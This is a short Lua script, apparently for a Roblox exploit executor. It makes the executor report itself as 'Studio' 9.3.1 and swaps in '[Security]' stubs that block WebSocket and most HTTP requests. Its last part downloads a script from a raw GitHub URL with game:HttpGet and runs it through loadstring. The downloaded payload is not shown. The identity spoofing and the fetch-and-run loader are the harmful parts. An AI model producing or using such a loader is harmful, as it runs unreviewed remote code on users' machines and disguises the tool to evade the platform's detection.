local genv = getgenv()
local SPOOF_NAME = "Studio"
local SPOOF_VER  = "9.3.1"
genv.identifyexecutor  = function() return SPOOF_NAME, SPOOF_VER end
genv.getexecutorname   = function() return SPOOF_NAME, SPOOF_VER end
genv.getexecutorversion= function() return SPOOF_VER end
local _bWS = setmetatable({}, {
    __index    = function(_, k) warn("[Security] WebSocket."..k.." blocked"); return function() end end,
    __newindex = function() end,
    __call     = function() warn("[Security] WebSocket() blocked"); return nil end,
})
if rawget(_G,"WebSocket")~=nil then rawset(_G,"WebSocket",_bWS) end
if rawget(_G,"websocket")~=nil then rawset(_G,"websocket",_bWS) end
local _origReq = http_request or request
local function safeRequest(opts)
    local url = (opts and opts.Url) or ""
    for _, d in ipairs({"roblox.com","robloxlabs.com"}) do
        if url:find(d,1,true) then return _origReq(opts) end
    end
    warn("[Security] Blocked:", url)
    return {StatusCode=403, Body=""}
end
http_request = safeRequest; request = safeRequest
local url = "https://raw.githubusercontent.com/zukatechlive/empty/refs/heads/main/ggsdcxwe.lua"
local ok, err = pcall(function()
    local src = game:HttpGet(url)
    assert(type(src)=="string" and #src>0, "Empty response")
    local fn, e = loadstring(src)
    assert(fn, "loadstring failed: "..tostring(e))
    fn()
end)
if not ok then warn("[Loader] Failed:", err) end
